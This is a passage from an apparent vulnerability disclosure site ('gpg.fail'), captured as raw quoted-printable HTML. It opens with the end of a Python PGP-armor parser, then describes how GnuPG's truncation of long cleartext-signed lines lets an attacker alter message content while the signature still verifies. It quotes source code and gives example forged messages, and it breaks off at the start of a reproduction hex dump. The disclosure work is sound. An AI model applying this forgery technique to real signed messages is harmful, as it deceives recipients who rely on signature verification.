span style=3D"color:#E6EDF3"> ArmorExpect.Preamble:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                if</span=
><span style=3D"color:#E6EDF3"> line.startswith(</span><span style=3D"color=
:#79C0FF">BEGIN</span><span style=3D"color:#E6EDF3">) </span><span style=3D=
"color:#FF7B72">and</span><span style=3D"color:#E6EDF3"> line.endswith(</sp=
an><span style=3D"color:#79C0FF">DASHES</span><span style=3D"color:#E6EDF3"=
>):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                    sect=
ion_type </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"colo=
r:#E6EDF3"> ArmorSectionType(line[</span><span style=3D"color:#79C0FF">len<=
/span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">B=
EGIN</span><span style=3D"color:#E6EDF3">):</span><span style=3D"color:#FF7=
B72">-</span><span style=3D"color:#79C0FF">len</span><span style=3D"color:#=
E6EDF3">(</span><span style=3D"color:#79C0FF">DASHES</span><span style=3D"c=
olor:#E6EDF3">)].strip())</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.section </span><span style=3D"color:#=
FF7B72">=3D</span><span style=3D"color:#E6EDF3"> ArmorSection(section_type)=
</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.expect </span><span style=3D"color:#F=
F7B72">=3D</span><span style=3D"color:#E6EDF3"> ArmorExpect.Header</span></=
span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> ArmorExpect.Header:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                if</span=
><span style=3D"color:#E6EDF3"> line </span><span style=3D"color:#FF7B72">=
=3D=3D</span><span style=3D"color:#A5D6FF"> ""</span><span style=3D"color:#=
E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.expect </span><span style=3D"color:#F=
F7B72">=3D</span><span style=3D"color:#E6EDF3"> ArmorExpect.Body</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FF7B72">                else</sp=
an><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                    head=
er </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6E=
DF3"> ArmorHeader(line)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.section.headers.append(header)</span>=
</span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    matc=
h</span><span style=3D"color:#E6EDF3"> header.tag:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
case</span><span style=3D"color:#E6EDF3"> ArmorHeaderTag.Hash:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
    pass</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
case</span><span style=3D"color:#E6EDF3"> ArmorHeaderTag.NotDashEscaped:</s=
pan></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
    self</span><span style=3D"color:#E6EDF3">.dash_escaping </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> False</span>=
</span>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
case</span><span style=3D"color:#E6EDF3"> _:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
    pass</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            case</span><=
span style=3D"color:#E6EDF3"> ArmorExpect.Body:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                opening =
</span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF=
"> self</span><span style=3D"color:#E6EDF3">.section.section_type</span></s=
pan>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                if</span=
><span style=3D"color:#E6EDF3"> line.startswith(</span><span style=3D"color=
:#79C0FF">END</span><span style=3D"color:#E6EDF3">) </span><span style=3D"c=
olor:#FF7B72">and</span><span style=3D"color:#E6EDF3"> line.endswith(</span=
><span style=3D"color:#79C0FF">DASHES</span><span style=3D"color:#E6EDF3">)=
:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                    clos=
ing </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6=
EDF3"> ArmorSectionType(line[</span><span style=3D"color:#79C0FF">len</span=
><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">END</s=
pan><span style=3D"color:#E6EDF3">):</span><span style=3D"color:#FF7B72">-<=
/span><span style=3D"color:#79C0FF">len</span><span style=3D"color:#E6EDF3"=
>(</span><span style=3D"color:#79C0FF">DASHES</span><span style=3D"color:#E=
6EDF3">)].strip())</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    if</=
span><span style=3D"color:#E6EDF3"> opening </span><span style=3D"color:#FF=
7B72">!=3D</span><span style=3D"color:#E6EDF3"> closing:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
raise</span><span style=3D"color:#79C0FF"> Exception</span><span style=3D"c=
olor:#E6EDF3">(</span><span style=3D"color:#FF7B72">f</span><span style=3D"=
color:#A5D6FF">"Mismatch between opening (</span><span style=3D"color:#FF7B=
72">&#123;</span><span style=3D"color:#E6EDF3">opening</span><span style=3D=
"color:#FF7B72">&#125;</span><span style=3D"color:#A5D6FF">) and closing (<=
/span><span style=3D"color:#FF7B72">&#123;</span><span style=3D"color:#E6ED=
F3">closing</span><span style=3D"color:#FF7B72">&#125;</span><span style=3D=
"color:#A5D6FF">) header line"</span><span style=3D"color:#E6EDF3">)</span>=
</span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.section.finalise()</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.sections.append(</span><span style=3D=
"color:#79C0FF">self</span><span style=3D"color:#E6EDF3">.section)</span></=
span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.section </span><span style=3D"color:#=
FF7B72">=3D</span><span style=3D"color:#79C0FF"> None</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.expect </span><span style=3D"color:#F=
F7B72">=3D</span><span style=3D"color:#E6EDF3"> ArmorExpect.Preamble</span>=
</span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                elif</sp=
an><span style=3D"color:#E6EDF3"> line.startswith(</span><span style=3D"col=
or:#79C0FF">BEGIN</span><span style=3D"color:#E6EDF3">) </span><span style=
=3D"color:#FF7B72">and</span><span style=3D"color:#E6EDF3"> line.endswith(<=
/span><span style=3D"color:#79C0FF">DASHES</span><span style=3D"color:#E6ED=
F3">):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                    sect=
ion_type </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"colo=
r:#E6EDF3"> ArmorSectionType(line[</span><span style=3D"color:#79C0FF">len<=
/span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#79C0FF">B=
EGIN</span><span style=3D"color:#E6EDF3">):</span><span style=3D"color:#FF7=
B72">-</span><span style=3D"color:#79C0FF">len</span><span style=3D"color:#=
E6EDF3">(</span><span style=3D"color:#79C0FF">DASHES</span><span style=3D"c=
olor:#E6EDF3">)].strip())</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    if</=
span><span style=3D"color:#E6EDF3"> section_type </span><span style=3D"colo=
r:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> ArmorSectionType.</s=
pan><span style=3D"color:#79C0FF">PGP_SIGNATURE</span><span style=3D"color:=
#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
self</span><span style=3D"color:#E6EDF3">.section.finalise()</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
self</span><span style=3D"color:#E6EDF3">.sections.append(</span><span styl=
e=3D"color:#79C0FF">self</span><span style=3D"color:#E6EDF3">.section)</spa=
n></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
self</span><span style=3D"color:#E6EDF3">.section </span><span style=3D"col=
or:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> ArmorSection(section_t=
ype)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
self</span><span style=3D"color:#E6EDF3">.expect </span><span style=3D"colo=
r:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> ArmorExpect.Header</spa=
n></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    elif=
</span><span style=3D"color:#E6EDF3"> opening.is_binary() </span><span styl=
e=3D"color:#FF7B72">or</span><span style=3D"color:#79C0FF"> self</span><spa=
n style=3D"color:#E6EDF3">.dash_escaping:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
raise</span><span style=3D"color:#79C0FF"> Exception</span><span style=3D"c=
olor:#E6EDF3">(</span><span style=3D"color:#FF7B72">f</span><span style=3D"=
color:#A5D6FF">"Unexpected opening header line '</span><span style=3D"color=
:#FF7B72">&#123;</span><span style=3D"color:#E6EDF3">section_type</span><sp=
an style=3D"color:#FF7B72">&#125;</span><span style=3D"color:#A5D6FF">'"</s=
pan><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    else=
</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">                        =
#print(f"Ignore opening header line '&#123;section_type&#125;'")</span></sp=
an>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
self</span><span style=3D"color:#E6EDF3">.section.message </span><span styl=
e=3D"color:#FF7B72">+=3D</span><span style=3D"color:#FF7B72"> f</span><span=
 style=3D"color:#A5D6FF">"</span><span style=3D"color:#FF7B72">&#123;</span=
><span style=3D"color:#E6EDF3">line</span><span style=3D"color:#FF7B72">&#1=
25;&#92;r&#92;n</span><span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                elif</sp=
an><span style=3D"color:#E6EDF3"> opening.is_binary():</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    if</=
span><span style=3D"color:#E6EDF3"> line.startswith(</span><span style=3D"c=
olor:#A5D6FF">"=3D"</span><span style=3D"color:#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
line </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E=
6EDF3"> line[</span><span style=3D"color:#79C0FF">1</span><span style=3D"co=
lor:#E6EDF3">:]</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.section.message </span><span style=3D=
"color:#FF7B72">+=3D</span><span style=3D"color:#E6EDF3"> line</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    if</=
span><span style=3D"color:#E6EDF3"> line.find(</span><span style=3D"color:#=
A5D6FF">"=3D"</span><span style=3D"color:#E6EDF3">) </span><span style=3D"c=
olor:#FF7B72">>=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=
=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
data </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E=
6EDF3"> b64decode(</span><span style=3D"color:#79C0FF">self</span><span sty=
le=3D"color:#E6EDF3">.section.message)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
self</span><span style=3D"color:#E6EDF3">.section.data.append(data)</span><=
/span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
self</span><span style=3D"color:#E6EDF3">.section.message </span><span styl=
e=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> ""</span></spa=
n>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                else</sp=
an><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    if</=
span><span style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3=
">.dash_escaping </span><span style=3D"color:#FF7B72">and</span><span style=
=3D"color:#E6EDF3"> line.startswith(</span><span style=3D"color:#79C0FF">DA=
SH_ESCAPE</span><span style=3D"color:#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
line </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E=
6EDF3"> line[</span><span style=3D"color:#79C0FF">len</span><span style=3D"=
color:#E6EDF3">(</span><span style=3D"color:#79C0FF">DASH_ESCAPE</span><spa=
n style=3D"color:#E6EDF3">):]</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                    if</=
span><span style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3=
">.section.message:</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                        =
self</span><span style=3D"color:#E6EDF3">.section.message </span><span styl=
e=3D"color:#FF7B72">+=3D</span><span style=3D"color:#A5D6FF"> "</span><span=
 style=3D"color:#FF7B72">&#92;r&#92;n</span><span style=3D"color:#A5D6FF">"=
</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">                    self=
</span><span style=3D"color:#E6EDF3">.section.message </span><span style=3D=
"color:#FF7B72">+=3D</span><span style=3D"color:#E6EDF3"> line</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">class</span><span style=
=3D"color:#FFA657"> Armor</span><span style=3D"color:#E6EDF3">:</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">    sections: list[Armor=
Section]</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __init__</span><span style=3D"color:#E6EDF3">(self, se=
ctions: list[ArmorSection] </span><span style=3D"color:#FF7B72">=3D</span><=
span style=3D"color:#E6EDF3"> []):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.sections </span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#E6EDF3"> sections</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> from_file</span><span style=3D"color:#E6EDF3">(self, f=
ile_name: </span><span style=3D"color:#79C0FF">str</span><span style=3D"col=
or:#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        with</span><span=
 style=3D"color:#79C0FF"> open</span><span style=3D"color:#E6EDF3">(file_na=
me, </span><span style=3D"color:#A5D6FF">"r"</span><span style=3D"color:#E6=
EDF3">) </span><span style=3D"color:#FF7B72">as</span><span style=3D"color:=
#FFA657"> file</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            parser </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> Ar=
morParser()</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            for</span><s=
pan style=3D"color:#E6EDF3"> line </span><span style=3D"color:#FF7B72">in</=
span><span style=3D"color:#FFA657"> file</span><span style=3D"color:#E6EDF3=
">.readlines():</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                parser.p=
ush_line(line)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">            self</span><=
span style=3D"color:#E6EDF3">.sections.extend(parser.sections)</span></span=
></code></pre><!----><!----></article><!----><!----></main> <footer class=
=3D"bg-blue-500 p-4">contact: <a href=3D"/cdn-cgi/l/email-protection" class=
=3D"__cf_email__" data-cfemail=3D"086b67667c696b7c486f786f266e696164">[emai=
l&#160;protected]</a></footer><!----><!--]--> <!--[!--><!--]--><!--]--><scr=
ipt data-cfasync=3D"false" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-stat=
ic/email-decode.min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="03-formfeed.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Cleartext Signature Plaintext Truncated for Hash Calculation</h1> <!----><=
p>An attacker can extend certain singed messages with arbitrary data in a w=
ay that still passed signature verification in <em>GnuPG</em>.</p> <h2>Impa=
ct</h2> <p>If an attacker obtains the signature S and plaintext P of a mess=
age where the message plaintext contains =E2=80=98\f\n=E2=80=99 (or in othe=
r words, has a line ending in =E2=80=98\f=E2=80=99), the attacker can craft=
 a signature plaintext pair (S,P=E2=80=99) where P=E2=80=99 has attacker co=
ntrolled inserts at those occurences in the plaintext and still successfull=
y verifies.</p> <p>Practically this this is applicable to the following sce=
nario:</p> <ul><li>An attacker obtains (P, S=E2=80=99) and</li></ul> <h2>De=
tails</h2> <p><em>GnuPG</em> truncates plaintext lines to 20000 characters =
minus padding:</p> <!----><pre class=3D"shiki github-dark-default" style=3D=
"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=
=3D"line"><span style=3D"color:#FF7B72">#define</span><span style=3D"color:=
#D2A8FF"> MAX_LINELEN</span><span style=3D"color:#79C0FF"> 20000</span></sp=
an>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">// ...</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">/* read the next line */=
</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">maxlen </span><span styl=
e=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3"> MAX_LINELEN;</=
span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">afx</span><span style=3D=
"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">buffer_pos </span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 0</spa=
n><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">afx</span><span style=3D=
"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">buffer_len </span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> iobuf_=
read_line</span><span style=3D"color:#E6EDF3">(a, </span><span style=3D"col=
or:#FF7B72">&#x26;</span><span style=3D"color:#E6EDF3">afx</span><span styl=
e=3D"color:#FF7B72">-></span><span style=3D"color:#FFA657">buffer</span><sp=
an style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                        =
          &#x26;</span><span style=3D"color:#E6EDF3">afx</span><span style=
=3D"color:#FF7B72">-></span><span style=3D"color:#FFA657">buffer_size</span=
><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF7B72">&#x26=
;</span><span style=3D"color:#FFA657">maxlen</span><span style=3D"color:#E6=
EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span style=
=3D"color:#E6EDF3">afx</span><span style=3D"color:#FF7B72">-></span><span s=
tyle=3D"color:#E6EDF3">buffer_len) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  rc </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#FF7B72"> -</span><span s=
tyle=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">;</span><span =
style=3D"color:#8B949E"> /* eof (should not happen) */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  continue</span><span s=
tyle=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span style=
=3D"color:#E6EDF3">maxlen) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  afx->truncated</span><=
span style=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3">;</span=
></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  this_truncated </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 1</s=
pan><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125; </span><span styl=
e=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> this_truncate=
d </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0=
FF"> 0</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">// ...</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">/* Now handle the end-of=
-line canonicalization */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">if</span><span style=3D"=
color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span style=
=3D"color:#E6EDF3">afx</span><span style=3D"color:#FF7B72">-></span><span s=
tyle=3D"color:#E6EDF3">not_dash_escaped </span><span style=3D"color:#FF7B72=
">||</span><span style=3D"color:#E6EDF3"> this_truncated) &#123;</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FF7B72">  int</span><span style=
=3D"color:#E6EDF3"> crlf </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#E6EDF3"> n </span><span style=3D"color:#FF7B72">></span>=
<span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#FF7B72"> &#x26=
;&#x26;</span><span style=3D"color:#FFA657"> p</span><span style=3D"color:#=
E6EDF3">[n </span><span style=3D"color:#FF7B72">-</span><span style=3D"colo=
r:#79C0FF"> 2</span><span style=3D"color:#E6EDF3">] </span><span style=3D"c=
olor:#FF7B72">=3D=3D</span><span style=3D"color:#A5D6FF"> '</span><span sty=
le=3D"color:#FF7B72">&#92;r</span><span style=3D"color:#A5D6FF">'</span><sp=
an style=3D"color:#FF7B72"> &#x26;&#x26;</span><span style=3D"color:#FFA657=
"> p</span><span style=3D"color:#E6EDF3">[n </span><span style=3D"color:#FF=
7B72">-</span><span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#=
E6EDF3">] </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"=
color:#A5D6FF"> '</span><span style=3D"color:#FF7B72">&#92;n</span><span st=
yle=3D"color:#A5D6FF">'</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  afx->buffer_len </span=
><span style=3D"color:#FF7B72">=3D</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    trim_trailing_chars<=
/span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&=
#x26;</span><span style=3D"color:#FFA657">p</span><span style=3D"color:#E6E=
DF3">[afx->buffer_pos], n </span><span style=3D"color:#FF7B72">-</span><spa=
n style=3D"color:#E6EDF3"> afx->buffer_pos,</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">                        =
" </span><span style=3D"color:#FF7B72">&#92;t&#92;r&#92;n</span><span style=
=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  afx->buffer_len </span=
><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#E6EDF3"> af=
x->buffer_pos;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  /* the buffer is alway=
s allocated with enough space to append</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * the removed [CR], L=
F and a Nul</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * The reason for this=
 complicated procedure is to keep at least</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * the original type o=
f lineending - handling of the removed</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * trailing spaces see=
ms to be impossible in our method</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * of faking a packet;=
 either we have to use a temporary file</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * or calculate the ha=
sh here in this module and somehow find</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * a way to send the h=
ash down the processing line (well, a special</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   * faked packet could =
do the job).</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         *</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         * To make sure =
that a truncated line triggers a bad</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         * signature err=
or we replace a removed LF by a FF or</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         * append a FF. =
 Right, this is a hack but better than a</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         * global variab=
le and way easier than to introduce a new</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         * control packe=
t or insert a line like "[truncated]&#92;n"</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         * into the filt=
er output.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">   */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (crlf) afx->buffer[afx->buffer_len</span><span style=3D=
"color:#FF7B72">++</span><span style=3D"color:#E6EDF3">] </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF"> '</span><span s=
tyle=3D"color:#FF7B72">&#92;r</span><span style=3D"color:#A5D6FF">'</span><=
span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  afx->buffer[afx->buffe=
r_len</span><span style=3D"color:#FF7B72">++</span><span style=3D"color:#E6=
EDF3">] </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color=
:#E6EDF3"> this_truncated </span><span style=3D"color:#FF7B72">?</span><spa=
n style=3D"color:#A5D6FF"> '</span><span style=3D"color:#FF7B72">=0C</span>=
<span style=3D"color:#A5D6FF">'</span><span style=3D"color:#FF7B72"> :</spa=
n><span style=3D"color:#A5D6FF"> '</span><span style=3D"color:#FF7B72">&#92=
;n</span><span style=3D"color:#A5D6FF">'</span><span style=3D"color:#E6EDF3=
">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  afx->buffer[afx->buffe=
r_len] </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:=
#A5D6FF"> '</span><span style=3D"color:#FF7B72">=00</span><span style=3D"co=
lor:#A5D6FF">'</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>When verifying a message like this:</p> <!----><pre cla=
ss=3D"shiki github-dark-default" style=3D"background-color:#0d1117;color:#e=
6edf3" tabindex=3D"0"><code><span class=3D"line"><span>-----BEGIN PGP SIGNE=
D MESSAGE-----</span></span>
<span class=3D"line"><span>Hash: SHA512</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>A[19998*A]ABBB</span></span>
<span class=3D"line"><span>CCC</span></span>
<span class=3D"line"><span>-----BEGIN PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>[...]</span></span>
<span class=3D"line"><span>-----END PGP SIGNATURE-----</span></span></code>=
</pre><!----> <p>The resulting hash buffer then contains <code>A[19998*A]A<=
/code>, the truncation mark <code>\f</code>, and <code>CCC</code>.</p> <p>H=
owever, a similar message with a different payload instead of <code>BBB</co=
de> like this:</p> <!----><pre class=3D"shiki github-dark-default" style=3D=
"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=
=3D"line"><span>-----BEGIN PGP SIGNED MESSAGE-----</span></span>
<span class=3D"line"><span>Hash: SHA512</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>A[19998*A]AXXX</span></span>
<span class=3D"line"><span>CCC</span></span>
<span class=3D"line"><span>-----BEGIN PGP SIGNATURE-----</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>[...]</span></span>
<span class=3D"line"><span>-----END PGP SIGNATURE-----</span></span></code>=
</pre><!----> <p>It results in the same hash buffer as before, since the ch=
anged section is truncated in the same way.</p> <p>Furthermore, before the =
<code>\f</code> gets inserted, the buffer gets its trailing characters trim=
med, allowing the <code>\f</code> to appear at any position between 0 and 2=
0,000 when padding it with =E2=80=99 =E2=80=99, =E2=80=98\t=E2=80=99 or =E2=
=80=98\r=E2=80=99. Using repeated carriage return characters usually result=
s in a single newline, making the attack practically invisible.</p> <h3>Det=
ailed steps to reproduce</h3> <h4>Scenario</h4> <p>Mallory sends Alice a pa=
yload to sign:</p> <!----><pre class=3D"shiki github-dark-default" style=3D=
"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=
=3D"line"><span>00000000:   53 69 67 6e  65 64 20 70  61 79 6c 6f  61 64 0d=
